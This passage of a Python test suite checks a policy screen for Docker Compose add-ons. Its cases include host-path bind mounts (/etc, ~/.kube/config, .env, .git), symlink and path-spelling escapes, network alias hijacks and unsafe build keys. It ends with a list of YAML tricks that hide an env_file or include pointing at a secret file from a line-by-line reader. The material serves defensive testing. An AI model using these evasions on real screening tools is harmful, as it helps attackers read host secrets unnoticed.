                            ({"type": None, "source": "/etc", "target": "/x"}, "volumes.type"), ({"type": "BIND", "source": "/etc", "target": "/x"}, "volumes.type"),
                            ({"type": "bind", "target": "/x"}, "volumes.source"), ({"type": "bind", "source": "", "target": "/x"}, "volumes.source")):
            with self.subTest(volume=volume):
                self.assertEqual(self.changed(CLEAN, mount(volume))["reasons"], [line("T01", key=key)])
        for volume in ({"type": "tmpfs", "target": "/x"}, {"type": "image", "source": "busybox", "target": "/x"},
                       {"type": "volume", "source": "clean-data", "target": "/x"}):
            with self.subTest(volume=volume):
                self.assertEqual(self.changed(CLEAN, mount(volume))["state"], "ok")

    def test_t01_the_keys_of_odd_mounts_are_said_once_beside_the_unknown_keys(self):
        def edit(arguments):
            service = arguments["unit_config"]["services"]["hostile-clean"]
            service.update(frobnicate=1, volumes=[{"type": "cluster", "source": "a", "target": "/a"}, {"type": "bind", "target": "/b"}])
        self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T01", key="frobnicate, volumes.type, volumes.source")])

    def test_t11_a_bind_outside_its_folder_is_a_class_h_finding(self):
        self.fires("t11-bind-outside", "T11", line("T11"))
        self.assertNotIn("T11", self.judge("t11-bind-outside", listed=True)["codes"])

    def test_t11_the_folder_of_the_unit_a_plugin_folder_and_the_closure_are_allowed(self):
        self.silent(CLEAN, "T11")
        self.ok("h-sibling-bind-ro")
        def plugins(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
                {"type": "bind", "source": str(self.root / "plugins/apim"), "target": "/p"},
                {"type": "bind", "source": str(self.root / "plugins/am/lib"), "target": "/q", "read_only": True}]
        self.assertEqual(self.changed(CLEAN, plugins)["state"], "ok")

    def test_t11_a_unit_of_another_catalog_is_never_a_root(self):
        for name in ("h-cross-catalog-env-ro", "h-cross-catalog-secrets-ro"):
            with self.subTest(unit=name):
                self.assertEqual(self.judge(name)["reasons"], [line("T11")])
                self.assertEqual(self.judge(name, listed=True)["reasons"], [line("T11")])
                self.assertEqual(self.declared(name, listed=True)["reasons"], [line("T11")])

    def test_t11_the_closure_of_the_same_catalog_is_what_makes_a_folder_a_root(self):
        """The reason both stranger tests are refused is that the roots do not hold the stranger's folder: hand it over, and
        the rule would pass it. build_roots is told the folders of the same catalog only, which is why the caller must be."""
        def edit(arguments):
            arguments["roots"]["closure"].append(str(self.root / ".lab/catalogs/partner/addons/ledger"))
        self.assertEqual(self.changed("h-cross-catalog-env-ro", edit)["state"], "ok")

    def test_t11_the_files_of_the_lab_are_out_of_reach_whatever_is_declared(self):
        self.assertEqual(self.declared("t11-bind-lab-state", listed=True)["reasons"], [line("T11")])
        self.assertEqual(self.judge("t11-bind-lab-state", listed=True)["reasons"], [line("T11")])
        for source in ("/", str(self.root), str(self.root.parent), str(self.root / ".lab"), str(self.root / ".lab/catalogs"),
                       str(self.root / ".env"), str(self.root / ".lab/catalogs/partner/addons/ledger/secrets")):
            def edit(arguments, source=source):
                arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [{"type": "bind", "source": source, "target": "/x", "read_only": True}]
            with self.subTest(source=source):
                self.assertEqual(self.changed(CLEAN, edit, listed=True)["reasons"][:1], [line("T11")])

    def test_t11_what_runs_on_this_machine_is_out_of_reach_too(self):
        """The seeder, the Lab, the core file, the Makefile and the history of the repository: a writable bind of any of them
        is code that runs next time, so no declaration allows it, not even to a listed catalog."""
        for name in trust.MACHINE_FILES:
            def edit(arguments, name=name):
                arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
                    {"type": "bind", "source": str(self.root / name / "sub"), "target": "/x", "read_only": True}]
            with self.subTest(name=name):
                self.assertEqual(self.changed(CLEAN, edit, listed=True)["reasons"], [line("T11")])
                self.assertEqual(self.declared_clean(edit)["reasons"], [line("T11")])
        self.assertEqual(trust.MACHINE_FILES, (".env", ".lab", "seeder", "lab-ui", "docker-compose.yml", "Makefile", ".git"))

    def declared_clean(self, edit):
        """The clean add-on of a listed catalog, with `edit` applied and a reason given for using the machine."""
        def both(arguments):
            edit(arguments)
            arguments["unit"]["meta"]["host_access"] = {"hostile-clean": "Because it must"}
        return self.changed(CLEAN, both, listed=True)

    def test_t11_the_files_of_the_lab_are_out_of_reach_in_any_case(self):
        """On the file system of a Mac `.ENV` is the file `.env`: the comparison does not care, a false match is a false
        Blocked, and the root of the project in capitals is the project."""
        upper = str(self.root).upper()
        for source in (str(self.root / ".ENV"), str(self.root / ".Env"), str(self.root / ".LAB/catalogs"), str(self.root / "SEEDER"),
                       upper, upper + "/.env", str(self.root / "Lab-UI/lab_ui")):
            def edit(arguments, source=source):
                arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [{"type": "bind", "source": source, "target": "/x", "read_only": True}]
            with self.subTest(source=source):
                self.assertEqual(self.changed(CLEAN, edit, listed=True)["reasons"][:1], [line("T11")])
                self.assertEqual(self.declared_clean(edit)["reasons"][:1], [line("T11")])
    def test_t11_a_folder_of_the_host_beside_the_lab_is_a_class_h_finding(self):
        def edit(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
                {"type": "bind", "source": HOME + "/.kube/config", "target": "/x", "read_only": True}]
        blocked = self.changed(CLEAN, edit)
        self.assertEqual(blocked["reasons"], [line("T11")])
        self.assertEqual(self.changed(CLEAN, edit, listed=True)["reasons"], [line("T28", service="hostile-clean")])
        verdict = self.changed(CLEAN, lambda arguments: (edit(arguments), arguments["unit"]["meta"].update(
            host_access={"hostile-clean": "Reads your kubeconfig"})), listed=True)
        self.assertEqual(verdict["state"], "ok")
        self.assertEqual(verdict["surface"]["uses_machine"][0]["what"], ["mounts ~/.kube/config of this machine"])

    def test_t11_a_link_cannot_lead_out_of_the_folder(self):
        unit = self.root / ".lab/catalogs/hostile/addons/p-clean-addon"
        (unit / "data").mkdir(parents=True)
        outside = self.root / "elsewhere"
        outside.mkdir()
        os.symlink(outside, unit / "link")
        def edit(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
                {"type": "bind", "source": str(unit / "link"), "target": "/x", "read_only": True},
                {"type": "bind", "source": str(unit / "data"), "target": "/y", "read_only": True}]
        self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T11")])

    def test_t11_without_the_real_path_the_paths_are_compared_as_written(self):
        """What the caller must hand in: judge reads no disk, so a link is only followed through context["realpath"]."""
        unit = self.root / ".lab/catalogs/hostile/addons/p-clean-addon"
        unit.mkdir(parents=True)
        os.symlink(self.root / "elsewhere", unit / "link")
        def edit(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
                {"type": "bind", "source": str(unit / "link"), "target": "/x", "read_only": True}]
        self.assertEqual(self.changed(CLEAN, edit, realpath=None)["state"], "ok")
        self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T11")])

    def test_t11_an_odd_spelling_misses_the_list_and_never_passes_it(self):
        unit = str(self.root / ".lab/catalogs/hostile/addons/p-clean-addon")
        for source in ("//" + unit.lstrip("/") + "/x", unit + "/../../p-other/x", unit + "/../../../x", "..", "x\0y", "~/x", "$HOME/x",
                       "data", "./data", "../x", unit + "x", unit + "-other/x", unit.upper() + "/x"):
            def edit(arguments, source=source):
                arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [{"type": "bind", "source": source, "target": "/x"}]
            with self.subTest(source=source):
                self.assertEqual(self.changed(CLEAN, edit, realpath=None)["reasons"], [line("T11")])
        def inside(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
                {"type": "bind", "source": unit + "/./a/../.state/x", "target": "/x"}]
        self.assertEqual(self.changed(CLEAN, inside, realpath=None)["state"], "ok")

    def test_t12_a_writable_bind_of_its_folder_blocks_and_its_state_and_secrets_do_not(self):
        self.fires("t12-bind-writable", "T12", line("T12"))
        self.ok("h-secrets-rw")
        self.silent(CLEAN, "T12")

    def test_t12_a_writable_bind_of_a_unit_of_the_closure_blocks_and_a_read_only_one_does_not(self):
        self.fires("h-sibling-bind-rw", "T12", line("T12"))
        self.ok("h-sibling-bind-ro")

    def test_t12_a_writable_bind_of_the_folder_itself_blocks(self):
        def edit(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
                {"type": "bind", "source": arguments["roots"]["unit"], "target": "/x"}]
        self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T12")])

    def test_t13_volumes_from_blocks(self):
        verdict = self.fires("t13-volumes-from", "T13", line("T13"))
        self.assertIn(line("T01", key="volumes_from"), verdict["reasons"])
        self.silent(CLEAN, "T13")

    def test_t14_an_external_a_foreign_or_disguised_volume_blocks(self):
        for name in ("t14-external-volume", "t14-core-volume", "t14-volume-alias"):
            with self.subTest(unit=name):
                self.assertEqual(self.judge(name)["reasons"], [line("T14")])

    def test_t14_a_volume_of_its_own_does_not(self):
        self.silent(CLEAN, "T14")
        self.assertEqual(self.judge(CLEAN)["state"], "ok")

    def test_t14_every_way_to_make_a_volume_a_folder_of_the_host(self):
        for definition in ({"driver": "nfs"}, {"driver_opts": {"device": "/etc", "o": "bind", "type": "none"}},
                           {"driver_opts": {"o": "rbind"}}, {"driver_opts": {"type": "CIFS"}}, {"driver_opts": {"type": "nfs"}},
                           {"external": True}, {"external": "true"}, {"name": "someone_elses_data"}):
            def edit(arguments, definition=definition):
                arguments["unit_config"]["volumes"]["clean-data"] = dict({"name": "gravitee_clean-data"}, **definition)
            with self.subTest(definition=definition):
                self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T14")])
        def fine(arguments):
            arguments["unit_config"]["volumes"]["clean-data"] = {"name": "gravitee_clean-data", "driver": "local",
                                                                 "driver_opts": {"type": "tmpfs", "o": "size=1m"}}
        self.assertEqual(self.changed(CLEAN, fine)["state"], "ok")

    def test_t15_an_external_network_blocks(self):
        self.fires("t15-external-network", "T15", line("T15"))

    def test_t15_the_lab_networks_and_a_bridge_of_its_own_do_not(self):
        self.silent(CLEAN, "T15")
        self.assertIn("own", self.args(CLEAN)["unit_config"]["networks"])

    def test_t15_every_way_to_leave_the_bridge(self):
        for definition in ({"driver": "host"}, {"driver": "macvlan"}, {"driver": "ipvlan"}, {"driver_opts": {"parent": "eth0"}},
                           {"external": True}, {"name": "bridge"}):
            def edit(arguments, definition=definition):
                arguments["unit_config"]["networks"]["own"] = dict({"name": "gravitee_own"}, **definition)
            with self.subTest(definition=definition):
                self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T15")])

    def test_t15_the_network_of_a_service_it_does_not_have_blocks_and_that_of_its_own_does_not(self):
        for mode, state in (("service:mongodb", "blocked"), ("service:", "blocked"), ("service:hostile-clean-other", "ok"),
                            ("service:redis", "ok"), ("none", "ok"), ("bridge", "ok")):
            def edit(arguments, mode=mode):
                arguments["unit_config"]["services"]["hostile-clean"].pop("networks", None)
                arguments["unit_config"]["services"]["hostile-clean"]["network_mode"] = mode
                arguments["unit_config"]["services"]["hostile-clean-other"] = {"image": "busybox"}
                arguments["own"] = ["hostile-clean", "hostile-clean-other"]
                arguments["context"]["closure_services"] = ["redis"]
            with self.subTest(mode=mode):
                self.assertEqual(self.changed(CLEAN, edit)["state"], state)
                self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T15")] if state == "blocked" else [])

    def test_t15_a_network_it_never_declared_blocks_and_the_default_does_not(self):
        def edit(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["networks"] = ["internal", "default", "elsewhere"]
        self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T15")])
        def fine(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["networks"] = {"internal": None, "default": None, "edge": {"aliases": ["a"]}}
        self.assertEqual(self.changed(CLEAN, fine)["state"], "ok")

    def test_t15_an_alias_of_a_service_of_the_platform_blocks(self):
        """A name on the lab network answers to the container that took it: `apim-management-api` must be the platform's."""
        self.assertEqual(self.judge("t15-alias-hijack")["reasons"], [line("T15")])
        core = regen.load("core")["services"]
        name = next(service["container_name"] for service in core.values() if service.get("container_name"))
        for alias in ("apim-management-api", "mongodb", name):
            def edit(arguments, alias=alias):
                arguments["unit_config"]["services"]["hostile-clean"]["networks"] = {"internal": {"aliases": ["fine", alias]}}
            with self.subTest(alias=alias):
                self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T15")])
                self.assertEqual(self.changed(CLEAN, edit, listed=True)["reasons"], [line("T15")])

    def test_t15_an_alias_of_a_service_it_brings_blocks_and_an_alias_of_its_own_does_not(self):
        def brings(arguments):
            arguments["unit_config"]["services"]["hostile-brought"] = {"image": "busybox:1.36", "container_name": "hostile-brought-box"}
            arguments["unit_config"]["services"]["hostile-clean"]["networks"] = {"internal": {"aliases": ["hostile-brought"]}}
        self.assertEqual(self.changed(CLEAN, brings)["reasons"], [line("T15")])
        def container(arguments):
            brings(arguments)
            arguments["unit_config"]["services"]["hostile-clean"]["networks"] = {"internal": {"aliases": ["hostile-brought-box"]}}
        self.assertEqual(self.changed(CLEAN, container)["reasons"], [line("T15")])
        def own(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["networks"] = {"internal": {"aliases": ["hostile-clean", "clean.example"]}}
        self.assertEqual(self.changed(CLEAN, own)["state"], "ok")
        def odd(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["networks"] = {
                "internal": {"aliases": "mongodb"}, "own": None, "edge": {"aliases": [None, 7, ["mongodb"], {"a": 1}]}}
        self.assertEqual(self.changed(CLEAN, odd)["state"], "ok")

    def test_t16_a_secret_or_a_config_from_outside_its_folder_blocks(self):
        self.fires("t16-secret-file", "T16", line("T16"))
        for key, definition in (("secrets", {"environment": "HOME"}), ("secrets", {"external": True}),
                                ("configs", {"file": "/etc/hosts"}), ("configs", {"environment": "X"})):
            def edit(arguments, key=key, definition=definition):
                arguments["unit_config"][key] = {"k": dict({"name": "gravitee_k"}, **definition)}
            with self.subTest(key=key, definition=definition):
                self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T16")])

    def test_t16_a_file_of_its_own_and_an_inline_content_do_not(self):
        def edit(arguments):
            arguments["unit_config"]["secrets"] = {"k": {"name": "gravitee_k", "file": arguments["roots"]["unit"] + "/key.txt"}}
            arguments["unit_config"]["configs"] = {"c": {"name": "gravitee_c", "content": "hello"}}
        self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")

    def test_t17_a_port_with_no_loopback_address_blocks(self):
        self.fires("t17-all-interfaces", "T17", line("T17"))
        self.silent(CLEAN, "T17")

    def test_t17_every_address_that_is_not_loopback(self):
        for port in ({"target": 80, "published": "8199"}, {"target": 80}, {"target": 80, "published": "1", "host_ip": "0.0.0.0"},
                     {"target": 80, "published": "1", "host_ip": "::"}, {"target": 80, "published": "1", "host_ip": "127.0.0.2"},
                     {"target": 80, "host_ip": "localhost"}, "8199:80", "80", "0.0.0.0:80:80"):
            def edit(arguments, port=port):
                arguments["unit_config"]["services"]["hostile-clean"]["ports"] = [port]
            with self.subTest(port=port):
                self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T17")])
        for port in ({"target": 80, "published": "1", "host_ip": "::1"}, "127.0.0.1:8199:80", "[::1]:8199:80"):
            def edit(arguments, port=port):
                arguments["unit_config"]["services"]["hostile-clean"]["ports"] = [port]
            with self.subTest(port=port):
                self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")


class Builds(Golden):

    def test_t18_a_context_outside_its_folder_blocks(self):
        self.assertEqual(self.judge("t18-build-outside")["reasons"], [line("T18", 0)])

    def test_t18_a_remote_context_must_be_a_git_repository_at_a_commit(self):
        self.assertEqual(self.judge("t18-build-remote-unpinned")["reasons"], [line("T18", 1)])
        sha = "0123456789abcdef0123456789abcdef01234567"
        for context, state in ((f"https://example.invalid/app.git#{sha}", "ok"), (f"git@example.invalid:o/r.git#{sha}", "ok"),
                               (f"https://example.invalid/app.git#{sha}:sub", "ok"), (f"github.com/o/r#{sha}", "ok"),
                               ("https://example.invalid/app.git", "blocked"), ("https://example.invalid/app.git#main", "blocked"),
                               (f"https://example.invalid/app.tar.gz#{sha}", "blocked"), ("https://example.invalid/app.git#0123", "blocked"),
                               (f"https://example.invalid/app.git#{sha.upper()}", "blocked"), ("github.com/o/r", "blocked")):
            def edit(arguments, context=context):
                arguments["unit_config"]["services"]["hostile-clean"]["build"] = {"context": context}
            with self.subTest(context=context):
                self.assertEqual(self.changed(CLEAN, edit)["state"], state)

    def build_edit(self, build, name=CLEAN, **more):
        """The verdict of `name` after the build of its service is replaced by `build`, a mapping or a text. `build` may name
        the places of the project as @unit@ and @seeder@ in its strings."""
        def edit(arguments):
            def fill(value):
                if isinstance(value, str):
                    return value.replace("@unit@", arguments["roots"]["unit"]).replace("@seeder@", arguments["roots"]["seeder"])
                if isinstance(value, dict):
                    return {key: fill(inner) for key, inner in value.items()}
                if isinstance(value, list):
                    return [fill(inner) for inner in value]
                return value
            arguments["unit_config"]["services"]["hostile-clean"]["build"] = fill(build)
        return self.changed(name, edit, **more)

    def test_t18_extra_access_blocks(self):
        for name in ("t18-build-extra-access", "t18-build-core-image"):
            self.assertEqual(self.judge(name)["reasons"], [line("T18", 2)], name)
        for key, value in (("ssh", ["default"]), ("secrets", [{"source": "k"}]), ("cache_to", ["type=local"]),
                           ("entitlements", ["network.host"]), ("tags", ["other:1"]), ("network", "host"), ("privileged", True)):
            def edit(arguments, key=key, value=value):
                build = arguments["unit_config"]["services"]["hostile-clean"]["build"]
                arguments["unit_config"]["services"]["hostile-clean"]["build"] = dict(
                    {"context": arguments["roots"]["unit"]} if isinstance(build, str) else {"context": arguments["roots"]["unit"]}, **{key: value})
            with self.subTest(key=key):
                self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T18", 2)] if key != "privileged" else [line("T03"), line("T18", 2)])

    # What Compose 5.6 knows of a build (the Compose file reference), and what a later Compose may add: none is accepted but the
    # five of the allow-list, so a key that is not in this list blocks as well (the last two)
    OTHER_BUILD_KEYS = ("additional_contexts", "cache_from", "cache_to", "dockerfile_inline", "entitlements", "extra_hosts",
                        "isolation", "network", "no_cache", "platforms", "privileged", "provenance", "pull", "sbom", "secrets",
                        "shm_size", "ssh", "tags", "ulimits", "x-note", "a_key_compose_adds_in_2031")

    def test_t18_the_five_keys_of_the_allow_list_are_the_whole_of_it(self):
        self.assertEqual(trust.BUILD_KEYS, ("context", "dockerfile", "args", "target", "labels"))
        self.assertEqual(trust.SEEDER_BUILD_KEYS, ("additional_contexts",))
        self.assertFalse(hasattr(trust, "EXTRA_BUILD"), "the deny list is gone: one list, the allow-list")

    def test_t18_a_build_with_the_keys_of_the_allow_list_passes(self):
        full = {"context": "@unit@", "dockerfile": "Dockerfile", "args": {"A": "1"}, "target": "release", "labels": {"k": "v"}}
        self.assertEqual(self.build_edit(full)["state"], "ok")
        for key in full:
            with self.subTest(key=key):
                self.assertEqual(self.build_edit({"context": "@unit@", key: full[key]} if key != "context" else {"context": "@unit@"})["state"], "ok")
        self.assertEqual(self.build_edit("@unit@")["state"], "ok", "a build written as a text is a context")
        self.assertEqual(self.build_edit({"args": {}, "labels": {}, "target": ""})["state"], "ok", "empty values are the keys' own")

    def test_t18_any_other_key_blocks_whatever_its_value(self):
        for key in self.OTHER_BUILD_KEYS:
            if key in ("additional_contexts", "privileged"):
                continue   # their own tests: the first is for the seeder, the second says T03 too
            for value in (True, False, None, "", 0, 1, [], {}, ["x"], {"a": "b"}, "x"):
                with self.subTest(key=key, value=value):
                    verdict = self.build_edit({"context": "@unit@", key: value})
                    self.assertEqual((verdict["state"], verdict["reasons"]), ("blocked", [line("T18", 2)]))

    def test_t18_privileged_in_a_build_is_the_extra_access_and_a_privileged_service(self):
        self.assertEqual(self.build_edit({"context": "@unit@", "privileged": True})["reasons"], [line("T03"), line("T18", 2)])
        self.assertEqual(self.build_edit({"context": "@unit@", "privileged": False})["reasons"], [line("T18", 2)])

    def test_t18_a_key_is_the_key_as_compose_prints_it_not_a_spelling_of_it(self):
        for key in ("Context", "CONTEXT", "context ", " context", "context\n", "dockerfile\u200b", "Args", "TARGET", "label", "labels:",
                    "build", "", "\u0441ontext"):   # the last is a Cyrillic es
            with self.subTest(key=key):
                self.assertEqual(self.build_edit({"context": "@unit@", key: "x"})["reasons"], [line("T18", 2)])

    def test_t18_a_remote_build_with_an_extra_key_blocks_for_the_key_as_well_as_for_a_pin_it_lacks(self):
        sha = "0123456789abcdef0123456789abcdef01234567"
        self.assertEqual(self.build_edit({"context": f"https://example.invalid/app.git#{sha}"})["state"], "ok")
        self.assertEqual(self.build_edit({"context": f"https://example.invalid/app.git#{sha}", "ssh": ["default"]})["reasons"],
                         [line("T18", 2)])
        self.assertEqual(self.build_edit({"context": "https://example.invalid/app.git", "pull": True})["reasons"],
                         [line("T18", 1), line("T18", 2)])

    def test_t18_a_build_that_is_neither_a_mapping_nor_a_text_cannot_be_judged_so_it_blocks(self):
        for build in (1, 1.5, True, ["context"], [{"context": "."}], [], 0):
            with self.subTest(build=build):
                self.assertEqual(self.build_edit(build)["reasons"], [line("T18", 2)])
        self.assertEqual(self.build_edit(None)["state"], "ok", "no build is no build")

    def test_t18_what_the_stage_that_builds_refuses_is_what_the_policy_blocks(self):
        for build, seeder, wanted in (({"context": ".", "dockerfile": "D", "args": {}, "target": "t", "labels": {}}, False, []),
                                      ("./app", False, []), ({"context": ".", "ssh": []}, False, ["ssh"]),
                                      ({"pull": 1, "network": "host", "context": "."}, False, ["network", "pull"]),
                                      ({"additional_contexts": {}}, False, ["additional_contexts"]),
                                      ({"additional_contexts": {}}, True, []),
                                      ({"additional_contexts": {}, "ssh": 1}, True, ["ssh"]), ({}, False, []),
                                      ({"x-a": 1, "x-b": 1}, True, ["x-a", "x-b"]), (7, False, ["build"]), (None, False, ["build"]),
                                      ([], False, ["build"])):
            with self.subTest(build=build, seeder=seeder):
                self.assertEqual(trust.build_extras(build, seeder), wanted)
        self.assertEqual(trust.build_extras({"b": 1, "a": 1, 3: 1}), ["3", "a", "b"], "sorted, as text")

    def test_t18_no_key_that_compose_prints_for_a_build_written_with_the_allowed_keys_is_outside_the_list(self):
        """Default-deny must not turn a build with the five keys into a block: Compose is asked what it prints for each way to write
        them (a list for `args` and `labels`, no `dockerfile`, a text), and none of the keys it prints is another."""
        if not fixtures.have_compose():
            print("skipped: the Docker CLI with Compose 5 or later is not installed", file=sys.stderr)
            self.skipTest("the Docker CLI with Compose 5 or later is not installed")
        text = ("services:\n  a: {build: ./app}\n  b:\n    build: {context: ./app, dockerfile: Dockerfile, target: dev,\n"
                "      args: [A=1, B], labels: [k=v]}\n  c:\n    build: {context: ./app, args: {A: 1}, labels: {k: v}}\n"
                "  d: {build: {context: ./app, dockerfile: sub/Dockerfile}}\n")
        (self.root / "app" / "sub").mkdir(parents=True)
        (self.root / "app" / "Dockerfile").write_text("FROM scratch\n", encoding="utf-8")
        (self.root / "app" / "sub" / "Dockerfile").write_text("FROM scratch\n", encoding="utf-8")
        (self.root / "compose.yml").write_text(text, encoding="utf-8")
        config = compose.config_json(["-f", str(self.root / "compose.yml")], environ=compose.scrubbed_environment())
        for name, service in config["services"].items():
            with self.subTest(service=name):
                self.assertEqual(trust.build_extras(service["build"]), [], service["build"])
                self.assertTrue(set(service["build"]) <= set(trust.BUILD_KEYS), service["build"])

    def test_t18_the_folder_of_the_unit_and_the_seeder_are_the_only_local_contexts(self):
        self.silent(CLEAN, "T18")
        self.silent(PLAYGROUND, "T18")
        def edit(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["build"] = {"context": arguments["roots"]["seeder"]}
        self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")
        def other(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["build"] = {"context": str(self.root / "plugins")}
        self.assertEqual(self.changed(CLEAN, other)["reasons"], [line("T18", 0)])

    def test_t18_a_dockerfile_outside_the_folder_blocks(self):
        for dockerfile, state in (("Dockerfile", "ok"), ("sub/Dockerfile", "ok"), ("../Dockerfile", "blocked"),
                                  ("/etc/Dockerfile", "blocked")):
            def edit(arguments, dockerfile=dockerfile):
                arguments["unit_config"]["services"]["hostile-clean"]["build"] = {"context": arguments["roots"]["unit"], "dockerfile": dockerfile}
            with self.subTest(dockerfile=dockerfile):
                self.assertEqual(self.changed(CLEAN, edit)["state"], state)

    CONTEXTS = (({"base": "docker-image://alpine:3"}, "ok", []), ({"base": "target:other"}, "ok", []),
                ({"base": "service:other"}, "ok", []), ({"base": "/etc"}, "blocked", [0]),
                ({"base": "https://example.invalid/x.git#main"}, "blocked", [1]),
                ({"base": "https://example.invalid/x.git#0123456789abcdef0123456789abcdef01234567"}, "ok", []),
                (["base=/etc"], "blocked", [0]), (["base=docker-image://alpine"], "ok", []), ({}, "ok", []), ([], "ok", []))

    def test_t18_an_additional_context_of_the_lab_seeder_is_held_to_the_same_as_the_context(self):
        for extra, state, variants in self.CONTEXTS:
            with self.subTest(extra=extra):
                verdict = self.build_edit({"context": "@seeder@", "additional_contexts": extra})
                self.assertEqual((verdict["state"], verdict["reasons"]), (state, [line("T18", each) for each in variants]))

    def test_t18_an_additional_context_of_any_other_build_blocks_whatever_it_names(self):
        for extra, state, variants in self.CONTEXTS:
            if extra in ({}, []):
                continue   # a key with nothing in it is still the key
            with self.subTest(extra=extra):
                verdict = self.build_edit({"context": "@unit@", "additional_contexts": extra})
                self.assertEqual((verdict["state"], verdict["reasons"]), ("blocked", [line("T18", each) for each in [*variants, 2]]))
        for build in ({"context": "@unit@", "additional_contexts": {}}, {"context": "@unit@", "additional_contexts": []}):
            self.assertEqual(self.build_edit(build)["reasons"], [line("T18", 2)], "the key alone is extra access")

    def test_t18_the_seeders_other_keys_are_held_to_the_list_and_its_additional_contexts_do_not_widen_it(self):
        base = {"context": "@seeder@", "additional_contexts": {"base": "docker-image://alpine:3"}}
        self.assertEqual(self.build_edit({**base, "args": {"A": "1"}, "target": "t", "labels": {"k": "v"}})["state"], "ok")
        self.assertEqual(self.build_edit({**base, "ssh": ["default"]})["reasons"], [line("T18", 2)])
        self.assertEqual(self.build_edit({**base, "dockerfile_inline": "FROM scratch"})["reasons"], [line("T18", 2)])

    def test_t18_a_seeder_that_takes_extra_contexts_is_not_the_labs_seeder_for_n01(self):
        """T18 accepts the key for the seeder's build; N01 is what keeps the token from a seed built with anything more."""
        def edit(arguments):
            arguments["unit_config"]["services"]["fixture-seed"] = {
                "image": "example.invalid/hostile/seeder", "labels": {"io.gravitee.role": "seed"},
                "build": {"context": arguments["roots"]["seeder"], "additional_contexts": {"base": "docker-image://alpine:3"}}}
            arguments["own"] = [*arguments["own"], "fixture-seed"]
        verdict = self.changed(PLAYGROUND, edit)
        self.assertNotIn("T18", verdict["codes"], verdict["reasons"])
        self.assertIn(line("N01"), verdict["notes"])

    def test_t18_a_context_and_a_pin_are_still_judged_with_the_keys_checked(self):
        self.assertEqual(self.build_edit({"context": "@unit@/../elsewhere"})["reasons"], [line("T18", 0)])
        self.assertEqual(self.build_edit({"context": "@unit@", "dockerfile": "../Dockerfile"})["reasons"], [line("T18", 0)])
        self.assertEqual(self.build_edit({"context": "@unit@/../elsewhere", "ssh": 1})["reasons"], [line("T18", 0), line("T18", 2)])

    def test_t18_a_build_as_a_text_is_a_context(self):
        def edit(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["build"] = "https://example.invalid/app.git#main"
        self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T18", 1)])


# What an author can write so that a reading line by line does not see the key, and Compose reads it. Each text was run through
# Compose 5.6.0 with a real file outside the folder, and Compose read it: test_compose_reads_what_the_screen_refuses runs them
# again when Compose is installed. @SECRET@, @INC@ and @BASE@ stand for a file outside the project.
HIDDEN = {
    "explicit-key-alone": 'services:\n  a:\n    image: busybox\n    ?\n      "env_file"\n    :\n      @SECRET@\n',
    "explicit-key-flow": "services: { a: { image: busybox, ? env_file\n  : @SECRET@ } }\n",
    "explicit-key-in-a-list": "services:\n  a:\n    image: busybox\n    env_file:\n      - ? path\n        : @SECRET@\n",
    "alias-key": "x-k: &k env_file\nservices:\n  a:\n    image: busybox\n    *k : @SECRET@\n",
    "alias-key-flow": "x-k: &k env_file\nservices: { a: { image: busybox, *k : @SECRET@ } }\n",
    "comment-then-nel": "services:\n  a:\n    image: busybox # note\u0085    env_file: @SECRET@\n",
    "comment-then-line-separator": "services:\n  a:\n    image: busybox # note\u2028    env_file: @SECRET@\n",
    "comment-then-paragraph-separator": "services:\n  a:\n    image: busybox # note\u2029    env_file: @SECRET@\n",
    "comment-then-cr": "services:\n  a:\n    image: busybox # note\r    env_file: @SECRET@\n",
    "quote-in-a-word": "services: {a: {image: busybox, hostname: x 'p, labels: {k: 'q # r'}, env_file: @SECRET@}}\n",
    "binary-key": "services:\n  a:\n    image: busybox\n    !!binary ZW52X2ZpbGU=: @SECRET@\n",
    "binary-verbatim": "services:\n  a:\n    image: busybox\n    !<tag:yaml.org,2002:binary> ZW52X2ZpbGU=: @SECRET@\n",
    "binary-percent": "services:\n  a:\n    image: busybox\n    !!%62inary ZW52X2ZpbGU=: @SECRET@\n",
    "tag-directive": "%TAG !b! tag:yaml.org,2002:bin\n---\nservices:\n  a:\n    image: busybox\n    !b!ary ZW52X2ZpbGU=: @SECRET@\n",
    "escaped": 'services:\n  a:\n    image: busybox\n    "env_\\x66ile": @SECRET@\n',
    "label-file": "services:\n  a:\n    image: busybox\n    label_file: @SECRET@\n",
    "include-explicit": "include:\n  - ?\n      path\n    : @INC@\nservices: {}\n",
    "include-alias-key": "x-k: &k path\ninclude:\n  - *k : @INC@\nservices: {}\n",
    "include-binary": "!!binary aW5jbHVkZQ==:\n  - @INC@\n",
    "include-escaped": '"inc\\x6cude":\n  - @INC@\n',
    "include-comment-then-nel": "services: {}\u0085# note\u0085include: [@INC@]\n",
